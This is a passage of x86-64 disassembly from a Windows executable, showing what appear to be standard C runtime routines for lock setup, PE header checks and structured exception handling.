   140003a0e:	48 83 c4 30          	add    $0x30,%rsp
   140003a12:	41 5e                	pop    %r14
   140003a14:	c3                   	ret
   140003a15:	cc                   	int3
   140003a16:	cc                   	int3
   140003a17:	cc                   	int3
   140003a18:	48 83 ec 28          	sub    $0x28,%rsp
   140003a1c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003a21:	e8 1e 35 00 00       	call   0x140006f44
   140003a26:	83 f8 01             	cmp    $0x1,%eax
   140003a29:	74 17                	je     0x140003a42
   140003a2b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003a30:	e8 0f 35 00 00       	call   0x140006f44
   140003a35:	85 c0                	test   %eax,%eax
   140003a37:	75 1d                	jne    0x140003a56
   140003a39:	83 3d 00 f6 00 00 01 	cmpl   $0x1,0xf600(%rip)        # 0x140013040
   140003a40:	75 14                	jne    0x140003a56
   140003a42:	b9 fc 00 00 00       	mov    $0xfc,%ecx
   140003a47:	e8 a4 fd ff ff       	call   0x1400037f0
   140003a4c:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003a51:	e8 9a fd ff ff       	call   0x1400037f0
   140003a56:	48 83 c4 28          	add    $0x28,%rsp
   140003a5a:	c3                   	ret
   140003a5b:	cc                   	int3
   140003a5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003a61:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003a66:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003a6b:	41 54                	push   %r12
   140003a6d:	48 83 ec 20          	sub    $0x20,%rsp
   140003a71:	4c 8d 25 e8 f8 00 00 	lea    0xf8e8(%rip),%r12        # 0x140013360
   140003a78:	33 f6                	xor    %esi,%esi
   140003a7a:	33 ff                	xor    %edi,%edi
   140003a7c:	49 8b dc             	mov    %r12,%rbx
   140003a7f:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   140003a83:	75 25                	jne    0x140003aaa
   140003a85:	48 63 c6             	movslq %esi,%rax
   140003a88:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003a8d:	ff c6                	inc    %esi
   140003a8f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003a93:	48 8d 05 46 14 01 00 	lea    0x11446(%rip),%rax        # 0x140014ee0
   140003a9a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140003a9e:	48 89 0b             	mov    %rcx,(%rbx)
   140003aa1:	e8 12 0a 00 00       	call   0x1400044b8
   140003aa6:	85 c0                	test   %eax,%eax
   140003aa8:	74 2d                	je     0x140003ad7
   140003aaa:	48 8d 05 ef fa 00 00 	lea    0xfaef(%rip),%rax        # 0x1400135a0
   140003ab1:	48 83 c3 10          	add    $0x10,%rbx
   140003ab5:	ff c7                	inc    %edi
   140003ab7:	48 3b d8             	cmp    %rax,%rbx
   140003aba:	7c c3                	jl     0x140003a7f
   140003abc:	b8 01 00 00 00       	mov    $0x1,%eax
   140003ac1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ac6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003acb:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003ad0:	48 83 c4 20          	add    $0x20,%rsp
   140003ad4:	41 5c                	pop    %r12
   140003ad6:	c3                   	ret
   140003ad7:	48 63 c7             	movslq %edi,%rax
   140003ada:	48 03 c0             	add    %rax,%rax
   140003add:	49 83 24 c4 00       	andq   $0x0,(%r12,%rax,8)
   140003ae2:	33 c0                	xor    %eax,%eax
   140003ae4:	eb db                	jmp    0x140003ac1
   140003ae6:	cc                   	int3
   140003ae7:	cc                   	int3
   140003ae8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003aed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003af2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003af7:	57                   	push   %rdi
   140003af8:	48 83 ec 20          	sub    $0x20,%rsp
   140003afc:	48 8d 1d 5d f8 00 00 	lea    0xf85d(%rip),%rbx        # 0x140013360
   140003b03:	48 8d 2d 96 fa 00 00 	lea    0xfa96(%rip),%rbp        # 0x1400135a0
   140003b0a:	48 8b fb             	mov    %rbx,%rdi
   140003b0d:	48 8b 37             	mov    (%rdi),%rsi
   140003b10:	48 85 f6             	test   %rsi,%rsi
   140003b13:	74 1b                	je     0x140003b30
   140003b15:	83 7f 08 01          	cmpl   $0x1,0x8(%rdi)
   140003b19:	74 15                	je     0x140003b30
   140003b1b:	48 8b ce             	mov    %rsi,%rcx
   140003b1e:	ff 15 94 a6 00 00    	call   *0xa694(%rip)        # 0x14000e1b8
   140003b24:	48 8b ce             	mov    %rsi,%rcx
   140003b27:	e8 ec ee ff ff       	call   0x140002a18
   140003b2c:	48 83 27 00          	andq   $0x0,(%rdi)
   140003b30:	48 83 c7 10          	add    $0x10,%rdi
   140003b34:	48 3b fd             	cmp    %rbp,%rdi
   140003b37:	7c d4                	jl     0x140003b0d
   140003b39:	48 8b 0b             	mov    (%rbx),%rcx
   140003b3c:	48 85 c9             	test   %rcx,%rcx
   140003b3f:	74 0c                	je     0x140003b4d
   140003b41:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   140003b45:	75 06                	jne    0x140003b4d
   140003b47:	ff 15 6b a6 00 00    	call   *0xa66b(%rip)        # 0x14000e1b8
   140003b4d:	48 83 c3 10          	add    $0x10,%rbx
   140003b51:	48 3b dd             	cmp    %rbp,%rbx
   140003b54:	7c e3                	jl     0x140003b39
   140003b56:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003b5b:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003b60:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003b65:	48 83 c4 20          	add    $0x20,%rsp
   140003b69:	5f                   	pop    %rdi
   140003b6a:	c3                   	ret
   140003b6b:	cc                   	int3
   140003b6c:	48 63 c9             	movslq %ecx,%rcx
   140003b6f:	48 8d 05 ea f7 00 00 	lea    0xf7ea(%rip),%rax        # 0x140013360
   140003b76:	48 03 c9             	add    %rcx,%rcx
   140003b79:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   140003b7d:	48 ff 25 3c a6 00 00 	rex.W jmp *0xa63c(%rip)        # 0x14000e1c0
   140003b84:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003b89:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003b8e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003b93:	41 55                	push   %r13
   140003b95:	48 83 ec 20          	sub    $0x20,%rsp
   140003b99:	48 63 d9             	movslq %ecx,%rbx
   140003b9c:	be 01 00 00 00       	mov    $0x1,%esi
   140003ba1:	48 83 3d c7 16 01 00 	cmpq   $0x0,0x116c7(%rip)        # 0x140015270
   140003ba8:	00 
   140003ba9:	75 17                	jne    0x140003bc2
   140003bab:	e8 68 fe ff ff       	call   0x140003a18
   140003bb0:	8d 4e 1d             	lea    0x1d(%rsi),%ecx
   140003bb3:	e8 38 fc ff ff       	call   0x1400037f0
   140003bb8:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003bbd:	e8 2e e4 ff ff       	call   0x140001ff0
   140003bc2:	48 8b fb             	mov    %rbx,%rdi
   140003bc5:	48 03 ff             	add    %rdi,%rdi
   140003bc8:	4c 8d 2d 91 f7 00 00 	lea    0xf791(%rip),%r13        # 0x140013360
   140003bcf:	49 83 7c fd 00 00    	cmpq   $0x0,0x0(%r13,%rdi,8)
   140003bd5:	74 04                	je     0x140003bdb
   140003bd7:	8b c6                	mov    %esi,%eax
   140003bd9:	eb 7b                	jmp    0x140003c56
   140003bdb:	b9 28 00 00 00       	mov    $0x28,%ecx
   140003be0:	e8 5f 22 00 00       	call   0x140005e44
   140003be5:	48 8b d8             	mov    %rax,%rbx
   140003be8:	48 85 c0             	test   %rax,%rax
   140003beb:	75 0f                	jne    0x140003bfc
   140003bed:	e8 b2 f4 ff ff       	call   0x1400030a4
   140003bf2:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140003bf8:	33 c0                	xor    %eax,%eax
   140003bfa:	eb 5a                	jmp    0x140003c56
   140003bfc:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140003c01:	e8 66 00 00 00       	call   0x140003c6c
   140003c06:	90                   	nop
   140003c07:	49 83 7c fd 00 00    	cmpq   $0x0,0x0(%r13,%rdi,8)
   140003c0d:	75 2f                	jne    0x140003c3e
   140003c0f:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003c14:	48 8b cb             	mov    %rbx,%rcx
   140003c17:	e8 9c 08 00 00       	call   0x1400044b8
   140003c1c:	85 c0                	test   %eax,%eax
   140003c1e:	75 17                	jne    0x140003c37
   140003c20:	48 8b cb             	mov    %rbx,%rcx
   140003c23:	e8 f0 ed ff ff       	call   0x140002a18
   140003c28:	e8 77 f4 ff ff       	call   0x1400030a4
   140003c2d:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140003c33:	33 f6                	xor    %esi,%esi
   140003c35:	eb 10                	jmp    0x140003c47
   140003c37:	49 89 5c fd 00       	mov    %rbx,0x0(%r13,%rdi,8)
   140003c3c:	eb 09                	jmp    0x140003c47
   140003c3e:	48 8b cb             	mov    %rbx,%rcx
   140003c41:	e8 d2 ed ff ff       	call   0x140002a18
   140003c46:	90                   	nop
   140003c47:	48 8b 0d b2 f7 00 00 	mov    0xf7b2(%rip),%rcx        # 0x140013400
   140003c4e:	ff 15 6c a5 00 00    	call   *0xa56c(%rip)        # 0x14000e1c0
   140003c54:	8b c6                	mov    %esi,%eax
   140003c56:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c5b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003c60:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003c65:	48 83 c4 20          	add    $0x20,%rsp
   140003c69:	41 5d                	pop    %r13
   140003c6b:	c3                   	ret
   140003c6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c71:	57                   	push   %rdi
   140003c72:	48 83 ec 20          	sub    $0x20,%rsp
   140003c76:	48 63 d9             	movslq %ecx,%rbx
   140003c79:	48 8d 3d e0 f6 00 00 	lea    0xf6e0(%rip),%rdi        # 0x140013360
   140003c80:	48 03 db             	add    %rbx,%rbx
   140003c83:	48 83 3c df 00       	cmpq   $0x0,(%rdi,%rbx,8)
   140003c88:	75 11                	jne    0x140003c9b
   140003c8a:	e8 f5 fe ff ff       	call   0x140003b84
   140003c8f:	85 c0                	test   %eax,%eax
   140003c91:	75 08                	jne    0x140003c9b
   140003c93:	8d 48 11             	lea    0x11(%rax),%ecx
   140003c96:	e8 e9 e2 ff ff       	call   0x140001f84
   140003c9b:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
   140003c9f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ca4:	48 83 c4 20          	add    $0x20,%rsp
   140003ca8:	5f                   	pop    %rdi
   140003ca9:	48 ff 25 18 a5 00 00 	rex.W jmp *0xa518(%rip)        # 0x14000e1c8
   140003cb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003cb5:	57                   	push   %rdi
   140003cb6:	48 83 ec 20          	sub    $0x20,%rsp
   140003cba:	48 8d 1d 57 ca 00 00 	lea    0xca57(%rip),%rbx        # 0x140010718
   140003cc1:	48 8d 3d 50 ca 00 00 	lea    0xca50(%rip),%rdi        # 0x140010718
   140003cc8:	eb 0e                	jmp    0x140003cd8
   140003cca:	48 8b 03             	mov    (%rbx),%rax
   140003ccd:	48 85 c0             	test   %rax,%rax
   140003cd0:	74 02                	je     0x140003cd4
   140003cd2:	ff d0                	call   *%rax
   140003cd4:	48 83 c3 08          	add    $0x8,%rbx
   140003cd8:	48 3b df             	cmp    %rdi,%rbx
   140003cdb:	72 ed                	jb     0x140003cca
   140003cdd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ce2:	48 83 c4 20          	add    $0x20,%rsp
   140003ce6:	5f                   	pop    %rdi
   140003ce7:	c3                   	ret
   140003ce8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ced:	57                   	push   %rdi
   140003cee:	48 83 ec 20          	sub    $0x20,%rsp
   140003cf2:	48 8d 1d 2f ca 00 00 	lea    0xca2f(%rip),%rbx        # 0x140010728
   140003cf9:	48 8d 3d 28 ca 00 00 	lea    0xca28(%rip),%rdi        # 0x140010728
   140003d00:	eb 0e                	jmp    0x140003d10
   140003d02:	48 8b 03             	mov    (%rbx),%rax
   140003d05:	48 85 c0             	test   %rax,%rax
   140003d08:	74 02                	je     0x140003d0c
   140003d0a:	ff d0                	call   *%rax
   140003d0c:	48 83 c3 08          	add    $0x8,%rbx
   140003d10:	48 3b df             	cmp    %rdi,%rbx
   140003d13:	72 ed                	jb     0x140003d02
   140003d15:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d1a:	48 83 c4 20          	add    $0x20,%rsp
   140003d1e:	5f                   	pop    %rdi
   140003d1f:	c3                   	ret
   140003d20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003d25:	57                   	push   %rdi
   140003d26:	48 83 ec 20          	sub    $0x20,%rsp
   140003d2a:	48 8d 1d 6f f8 00 00 	lea    0xf86f(%rip),%rbx        # 0x1400135a0
   140003d31:	bf 0a 00 00 00       	mov    $0xa,%edi
   140003d36:	48 8b 0b             	mov    (%rbx),%rcx
   140003d39:	e8 56 f7 ff ff       	call   0x140003494
   140003d3e:	48 89 03             	mov    %rax,(%rbx)
   140003d41:	48 83 c3 08          	add    $0x8,%rbx
   140003d45:	48 83 ef 01          	sub    $0x1,%rdi
   140003d49:	75 eb                	jne    0x140003d36
   140003d4b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d50:	48 83 c4 20          	add    $0x20,%rsp
   140003d54:	5f                   	pop    %rdi
   140003d55:	c3                   	ret
   140003d56:	cc                   	int3
   140003d57:	cc                   	int3
   140003d58:	cc                   	int3
   140003d59:	cc                   	int3
   140003d5a:	cc                   	int3
   140003d5b:	cc                   	int3
   140003d5c:	cc                   	int3
   140003d5d:	cc                   	int3
   140003d5e:	cc                   	int3
   140003d5f:	cc                   	int3
   140003d60:	48 8b c1             	mov    %rcx,%rax
   140003d63:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140003d68:	66 39 08             	cmp    %cx,(%rax)
   140003d6b:	74 03                	je     0x140003d70
   140003d6d:	33 c0                	xor    %eax,%eax
   140003d6f:	c3                   	ret
   140003d70:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140003d74:	48 03 c8             	add    %rax,%rcx
   140003d77:	33 c0                	xor    %eax,%eax
   140003d79:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003d7f:	75 0c                	jne    0x140003d8d
   140003d81:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140003d86:	66 39 51 18          	cmp    %dx,0x18(%rcx)
   140003d8a:	0f 94 c0             	sete   %al
   140003d8d:	f3 c3                	repz ret
   140003d8f:	cc                   	int3
   140003d90:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   140003d94:	45 33 c9             	xor    %r9d,%r9d
   140003d97:	4c 8b d2             	mov    %rdx,%r10
   140003d9a:	4c 03 c1             	add    %rcx,%r8
   140003d9d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140003da2:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   140003da7:	4a 8d 4c 00 18       	lea    0x18(%rax,%r8,1),%rcx
   140003dac:	45 85 db             	test   %r11d,%r11d
   140003daf:	74 1e                	je     0x140003dcf
   140003db1:	8b 51 0c             	mov    0xc(%rcx),%edx
   140003db4:	4c 3b d2             	cmp    %rdx,%r10
   140003db7:	72 0a                	jb     0x140003dc3
   140003db9:	8b 41 08             	mov    0x8(%rcx),%eax
   140003dbc:	03 c2                	add    %edx,%eax
   140003dbe:	4c 3b d0             	cmp    %rax,%r10
   140003dc1:	72 0f                	jb     0x140003dd2
   140003dc3:	41 ff c1             	inc    %r9d
   140003dc6:	48 83 c1 28          	add    $0x28,%rcx
   140003dca:	45 3b cb             	cmp    %r11d,%r9d
   140003dcd:	72 e2                	jb     0x140003db1
   140003dcf:	33 c0                	xor    %eax,%eax
   140003dd1:	c3                   	ret
   140003dd2:	48 8b c1             	mov    %rcx,%rax
   140003dd5:	c3                   	ret
   140003dd6:	cc                   	int3
   140003dd7:	cc                   	int3
   140003dd8:	cc                   	int3
   140003dd9:	cc                   	int3
   140003dda:	cc                   	int3
   140003ddb:	cc                   	int3
   140003ddc:	cc                   	int3
   140003ddd:	cc                   	int3
   140003dde:	cc                   	int3
   140003ddf:	cc                   	int3
   140003de0:	48 83 ec 28          	sub    $0x28,%rsp
   140003de4:	4c 8b c1             	mov    %rcx,%r8
   140003de7:	4c 8d 0d 12 c2 ff ff 	lea    -0x3dee(%rip),%r9        # 0x140000000
   140003dee:	49 8b c9             	mov    %r9,%rcx
   140003df1:	e8 6a ff ff ff       	call   0x140003d60
   140003df6:	85 c0                	test   %eax,%eax
   140003df8:	74 22                	je     0x140003e1c
   140003dfa:	4d 2b c1             	sub    %r9,%r8
   140003dfd:	49 8b d0             	mov    %r8,%rdx
   140003e00:	49 8b c9             	mov    %r9,%rcx
   140003e03:	e8 88 ff ff ff       	call   0x140003d90
   140003e08:	48 85 c0             	test   %rax,%rax
   140003e0b:	74 0f                	je     0x140003e1c
   140003e0d:	8b 40 24             	mov    0x24(%rax),%eax
   140003e10:	c1 e8 1f             	shr    $0x1f,%eax
   140003e13:	f7 d0                	not    %eax
   140003e15:	83 e0 01             	and    $0x1,%eax
   140003e18:	eb 02                	jmp    0x140003e1c
   140003e1a:	33 c0                	xor    %eax,%eax
   140003e1c:	48 83 c4 28          	add    $0x28,%rsp
   140003e20:	c3                   	ret
   140003e21:	cc                   	int3
   140003e22:	cc                   	int3
   140003e23:	cc                   	int3
   140003e24:	48 8b c4             	mov    %rsp,%rax
   140003e27:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003e2b:	48 89 68 18          	mov    %rbp,0x18(%rax)
   140003e2f:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140003e33:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140003e37:	57                   	push   %rdi
   140003e38:	41 54                	push   %r12
   140003e3a:	41 55                	push   %r13
   140003e3c:	41 56                	push   %r14
   140003e3e:	41 57                	push   %r15
   140003e40:	48 83 ec 40          	sub    $0x40,%rsp
   140003e44:	4d 8b 79 08          	mov    0x8(%r9),%r15
   140003e48:	4d 8b 21             	mov    (%r9),%r12
   140003e4b:	49 8b 71 38          	mov    0x38(%r9),%rsi
   140003e4f:	4d 2b e7             	sub    %r15,%r12
   140003e52:	f6 41 04 66          	testb  $0x66,0x4(%rcx)
   140003e56:	4d 8b f1             	mov    %r9,%r14
   140003e59:	48 8b ea             	mov    %rdx,%rbp
   140003e5c:	4c 8b e9             	mov    %rcx,%r13
   140003e5f:	0f 85 dc 00 00 00    	jne    0x140003f41
   140003e65:	33 ff                	xor    %edi,%edi
   140003e67:	48 89 48 c8          	mov    %rcx,-0x38(%rax)
   140003e6b:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   140003e6f:	39 3e                	cmp    %edi,(%rsi)
   140003e71:	0f 86 2b 01 00 00    	jbe    0x140003fa2
   140003e77:	48 8d 5e 0c          	lea    0xc(%rsi),%rbx
   140003e7b:	8b 43 f8             	mov    -0x8(%rbx),%eax
   140003e7e:	4c 3b e0             	cmp    %rax,%r12
   140003e81:	0f 82 a7 00 00 00    	jb     0x140003f2e
   140003e87:	8b 43 fc             	mov    -0x4(%rbx),%eax
   140003e8a:	4c 3b e0             	cmp    %rax,%r12
   140003e8d:	0f 83 9b 00 00 00    	jae    0x140003f2e
   140003e93:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003e97:	0f 84 91 00 00 00    	je     0x140003f2e
   140003e9d:	83 3b 01             	cmpl   $0x1,(%rbx)
   140003ea0:	74 19                	je     0x140003ebb
   140003ea2:	8b 03                	mov    (%rbx),%eax
   140003ea4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003ea9:	48 8b d5             	mov    %rbp,%rdx
   140003eac:	49 03 c7             	add    %r15,%rax
   140003eaf:	ff d0                	call   *%rax
   140003eb1:	85 c0                	test   %eax,%eax
   140003eb3:	0f 88 84 00 00 00    	js     0x140003f3d
   140003eb9:	7e 73                	jle    0x140003f2e
   140003ebb:	41 81 7d 00 63 73 6d 	cmpl   $0xe06d7363,0x0(%r13)
   140003ec2:	e0 
   140003ec3:	75 28                	jne    0x140003eed
   140003ec5:	48 83 3d 3b c2 00 00 	cmpq   $0x0,0xc23b(%rip)        # 0x140010108
   140003ecc:	00 
   140003ecd:	74 1e                	je     0x140003eed
   140003ecf:	48 8d 0d 32 c2 00 00 	lea    0xc232(%rip),%rcx        # 0x140010108
   140003ed6:	e8 05 ff ff ff       	call   0x140003de0
   140003edb:	85 c0                	test   %eax,%eax
   140003edd:	74 0e                	je     0x140003eed
   140003edf:	ba 01 00 00 00       	mov    $0x1,%edx
   140003ee4:	49 8b cd             	mov    %r13,%rcx
   140003ee7:	ff 15 1b c2 00 00    	call   *0xc21b(%rip)        # 0x140010108
   140003eed:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140003ef0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003ef6:	48 8b d5             	mov    %rbp,%rdx
   140003ef9:	49 03 cf             	add    %r15,%rcx
   140003efc:	e8 0f 1f 00 00       	call   0x140005e10
   140003f01:	49 8b 46 40          	mov    0x40(%r14),%rax
   140003f05:	8b 53 04             	mov    0x4(%rbx),%edx
   140003f08:	4d 63 4d 00          	movslq 0x0(%r13),%r9
   140003f0c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003f11:	49 8b 46 28          	mov    0x28(%r14),%rax
   140003f15:	49 03 d7             	add    %r15,%rdx
   140003f18:	4d 8b c5             	mov    %r13,%r8
   140003f1b:	48 8b cd             	mov    %rbp,%rcx
   140003f1e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003f23:	ff 15 a7 a2 00 00    	call   *0xa2a7(%rip)        # 0x14000e1d0
   140003f29:	e8 12 1f 00 00       	call   0x140005e40
   140003f2e:	ff c7                	inc    %edi
   140003f30:	48 83 c3 10          	add    $0x10,%rbx
   140003f34:	3b 3e                	cmp    (%rsi),%edi
   140003f36:	73 6a                	jae    0x140003fa2
   140003f38:	e9 3e ff ff ff       	jmp    0x140003e7b
   140003f3d:	33 c0                	xor    %eax,%eax
   140003f3f:	eb 66                	jmp    0x140003fa7
   140003f41:	49 8b 79 20          	mov    0x20(%r9),%rdi
   140003f45:	33 ed                	xor    %ebp,%ebp
   140003f47:	49 2b ff             	sub    %r15,%rdi
   140003f4a:	39 2e                	cmp    %ebp,(%rsi)
   140003f4c:	76 54                	jbe    0x140003fa2
   140003f4e:	48 8d 5e 10          	lea    0x10(%rsi),%rbx
   140003f52:	8b 4b f4             	mov    -0xc(%rbx),%ecx
   140003f55:	4c 3b e1             	cmp    %rcx,%r12
   140003f58:	72 3e                	jb     0x140003f98
   140003f5a:	8b 43 f8             	mov    -0x8(%rbx),%eax
   140003f5d:	4c 3b e0             	cmp    %rax,%r12
   140003f60:	73 36                	jae    0x140003f98
   140003f62:	48 3b f9             	cmp    %rcx,%rdi
   140003f65:	72 0c                	jb     0x140003f73
   140003f67:	48 3b f8             	cmp    %rax,%rdi
   140003f6a:	73 07                	jae    0x140003f73
   140003f6c:	41 f6 45 04 20       	testb  $0x20,0x4(%r13)
   140003f71:	75 2f                	jne    0x140003fa2
   140003f73:	83 3b 00             	cmpl   $0x0,(%rbx)
   140003f76:	74 09                	je     0x140003f81
   140003f78:	8b 03                	mov    (%rbx),%eax
   140003f7a:	48 3b f8             	cmp    %rax,%rdi
   140003f7d:	74 23                	je     0x140003fa2
   140003f7f:	eb 17                	jmp    0x140003f98
   140003f81:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140003f86:	49 03 c7             	add    %r15,%rax
   140003f89:	b1 01                	mov    $0x1,%cl
   140003f8b:	49 89 06             	mov    %rax,(%r14)
   140003f8e:	44 8b 43 fc          	mov    -0x4(%rbx),%r8d
   140003f92:	4d 03 c7             	add    %r15,%r8
   140003f95:	41 ff d0             	call   *%r8
   140003f98:	ff c5                	inc    %ebp
   140003f9a:	48 83 c3 10          	add    $0x10,%rbx
   140003f9e:	3b 2e                	cmp    (%rsi),%ebp
   140003fa0:	72 b0                	jb     0x140003f52
   140003fa2:	b8 01 00 00 00       	mov    $0x1,%eax
   140003fa7:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140003fac:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003fb0:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140003fb4:	49 8b 73 48          	mov    0x48(%r11),%rsi
   140003fb8:	49 8b e3             	mov    %r11,%rsp
   140003fbb:	41 5f                	pop    %r15
   140003fbd:	41 5e                	pop    %r14
   140003fbf:	41 5d                	pop    %r13
   140003fc1:	41 5c                	pop    %r12
   140003fc3:	5f                   	pop    %rdi
   140003fc4:	c3                   	ret
   140003fc5:	cc                   	int3
   140003fc6:	cc                   	int3
   140003fc7:	cc                   	int3
   140003fc8:	48 83 ec 28          	sub    $0x28,%rsp
   140003fcc:	e8 3f f6 ff ff       	call   0x140003610
   140003fd1:	48 8b 88 d0 00 00 00 	mov    0xd0(%rax),%rcx
   140003fd8:	48 85 c9             	test   %rcx,%rcx
   140003fdb:	74 04                	je     0x140003fe1
   140003fdd:	ff d1                	call   *%rcx
   140003fdf:	eb 00                	jmp    0x140003fe1
   140003fe1:	e8 ba 2f 00 00       	call   0x140006fa0
   140003fe6:	48 83 c4 28          	add    $0x28,%rsp
   140003fea:	c3                   	ret
   140003feb:	cc                   	int3
   140003fec:	48 83 ec 28          	sub    $0x28,%rsp
   140003ff0:	48 8b 0d 19 11 01 00 	mov    0x11119(%rip),%rcx        # 0x140015110
   140003ff7:	e8 ac f4 ff ff       	call   0x1400034a8
   140003ffc:	48 85 c0             	test   %rax,%rax
   140003fff:	74 04                	je     0x140004005
   140004001:	ff d0                	call   *%rax
   140004003:	eb 00                	jmp    0x140004005
   140004005:	e8 be ff ff ff       	call   0x140003fc8
   14000400a:	cc                   	int3
   14000400b:	48 83 c4 28          	add    $0x28,%rsp
   14000400f:	c3                   	ret
   140004010:	48 83 ec 28          	sub    $0x28,%rsp
   140004014:	48 8d 0d ad ff ff ff 	lea    -0x53(%rip),%rcx        # 0x140003fc8
   14000401b:	e8 74 f4 ff ff       	call   0x140003494
   140004020:	48 89 05 e9 10 01 00 	mov    %rax,0x110e9(%rip)        # 0x140015110
   140004027:	48 83 c4 28          	add    $0x28,%rsp
   14000402b:	c3                   	ret
   14000402c:	c2 00 00             	ret    $0x0
   14000402f:	cc                   	int3
   140004030:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004035:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000403a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000403f:	57                   	push   %rdi
   140004040:	48 83 ec 20          	sub    $0x20,%rsp
   140004044:	48 8b f2             	mov    %rdx,%rsi
   140004047:	8b f9                	mov    %ecx,%edi
   140004049:	e8 3e f5 ff ff       	call   0x14000358c
   14000404e:	45 33 db             	xor    %r11d,%r11d
   140004051:	48 8b d8             	mov    %rax,%rbx
   140004054:	49 3b c3             	cmp    %r11,%rax
   140004057:	0f 84 8a 01 00 00    	je     0x1400041e7
   14000405d:	48 8b 88 a0 00 00 00 	mov    0xa0(%rax),%rcx
   140004064:	4c 63 05 91 f5 00 00 	movslq 0xf591(%rip),%r8        # 0x1400135fc
   14000406b:	48 8b d1             	mov    %rcx,%rdx
   14000406e:	39 3a                	cmp    %edi,(%rdx)
   140004070:	74 13                	je     0x140004085
   140004072:	49 8b c0             	mov    %r8,%rax
   140004075:	48 83 c2 10          	add    $0x10,%rdx
   140004079:	48 c1 e0 04          	shl    $0x4,%rax
   14000407d:	48 03 c1             	add    %rcx,%rax
   140004080:	48 3b d0             	cmp    %rax,%rdx
   140004083:	72 e9                	jb     0x14000406e
   140004085:	49 8b c0             	mov    %r8,%rax
   140004088:	48 c1 e0 04          	shl    $0x4,%rax
   14000408c:	48 03 c1             	add    %rcx,%rax
   14000408f:	48 3b d0             	cmp    %rax,%rdx
   140004092:	73 04                	jae    0x140004098
   140004094:	39 3a                	cmp    %edi,(%rdx)
   140004096:	74 03                	je     0x14000409b
   140004098:	49 8b d3             	mov    %r11,%rdx
   14000409b:	49 3b d3             	cmp    %r11,%rdx
   14000409e:	0f 84 43 01 00 00    	je     0x1400041e7
   1400040a4:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   1400040a8:	4d 3b c3             	cmp    %r11,%r8
   1400040ab:	0f 84 36 01 00 00    	je     0x1400041e7
   1400040b1:	49 83 f8 05          	cmp    $0x5,%r8
   1400040b5:	75 0d                	jne    0x1400040c4
   1400040b7:	4c 89 5a 08          	mov    %r11,0x8(%rdx)
   1400040bb:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   1400040bf:	e9 25 01 00 00       	jmp    0x1400041e9
   1400040c4:	49 83 f8 01          	cmp    $0x1,%r8
   1400040c8:	75 08                	jne    0x1400040d2
   1400040ca:	83 c8 ff             	or     $0xffffffff,%eax
   1400040cd:	e9 17 01 00 00       	jmp    0x1400041e9
   1400040d2:	48 8b ab a8 00 00 00 	mov    0xa8(%rbx),%rbp
